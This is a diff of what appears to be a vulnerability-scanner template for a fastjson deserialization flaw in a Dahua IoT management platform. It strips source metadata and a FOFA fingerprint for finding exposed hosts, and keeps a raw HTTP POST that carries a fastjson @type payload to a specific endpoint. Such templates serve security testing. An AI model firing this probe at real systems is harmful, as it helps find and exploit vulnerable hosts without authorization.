@@ -3,12 +3,8 @@ info:
   name: 大华智能物联综合管理平台 fastjson反序列化漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rtwlqwf6hlk8cebx'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rtwlqwf6hlk8cebx
-    fofa: icon_hash="-1935899595"
 http:
 - raw:
   - 'POST /evo-runs/v1.0/auths/sysusers/random HTTP/2
@@ -21,10 +17,6 @@ http:
 
 
     Content-Type: application/json
-
-
-
-
 
 
     {"a":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.net.URL","val":"http://www.baidu.com"}}""}
